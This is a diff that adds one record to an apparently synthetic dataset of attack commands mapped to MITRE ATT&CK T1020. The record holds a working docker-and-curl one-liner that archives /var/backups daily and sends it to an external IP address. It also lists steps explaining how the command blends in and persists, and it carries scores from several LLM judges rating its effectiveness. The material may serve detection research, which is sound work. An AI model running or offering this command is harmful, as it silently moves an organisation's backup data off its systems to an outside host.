@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_backups --network host -e HN=$(hostname) -v /var/backups:/data:ro curlimages/curl:8.8.0 sh -c 'while true; do TS=$(date +%s); tar -C /data -cz . | curl -s -H \"Content-Type: application/octet-stream\" --data-binary @- \"https://203.0.113.15/ingest/$HN/backups_$TS.tgz\"; sleep 86400; done'",
+  "explanation": "Exfiltrates /var/backups once per day via HTTPS with minimal output, running continuously in the background.",
+  "rationale_steps": [
+    "Accesses backups through a read-only bind mount",
+    "Automates daily transfer using a long sleep interval",
+    "Uses HTTPS and silent curl to blend in and reduce noise",
+    "Detached container provides persistence without host changes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-f12262af",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Docker and shell syntax with balanced quoting, valid flags, and proper command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements automated HTTPS exfiltration of /var/backups via tar piped to curl in a detached loop, though success depends on the container having tar, sufficient read permissions, and the target IP being reachable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T05:00:09.494687Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid Docker and curl flags, and correct shell syntax for the embedded script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a persistent Docker container that compresses /var/backups and sends it daily via HTTPS to an external server, with hostname identification and timestamps.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:00:12.250628Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid flags, correct command separators, and no discernible syntax errors in either the Docker or the shell commands.",
+        "semantic_score": 4,
+        "semantic_justification": "The command perfectly achieves automated data exfiltration using appropriate tools and arguments, aligning strongly with MITRE ATT&CK T1020, but the stated 'Privilege: None' conflicts with the actual elevated privilege required to execute `docker run`.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:00:44.561085Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
